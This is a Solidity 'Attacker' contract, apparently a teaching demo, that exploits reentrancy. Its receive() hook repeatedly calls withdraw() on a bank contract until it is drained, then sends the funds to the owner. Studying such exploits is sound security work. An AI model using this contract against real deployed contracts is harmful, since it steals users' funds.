// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice 重入攻击合约（演示用，请不要修改）
contract Attacker {
    IBank public immutable bank;
    address public immutable owner;
    uint256 public stake;
    uint256 public reentries;

    constructor(IBank bank_) {
        bank = bank_;
        owner = msg.sender;
    }

    function attack() external payable {
        stake = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    /// 每收到一笔 ETH，只要银行里还有钱，就再取一次
    receive() external payable {
        if (address(bank).balance >= stake) {
            reentries++;
            bank.withdraw();
        }
    }
}
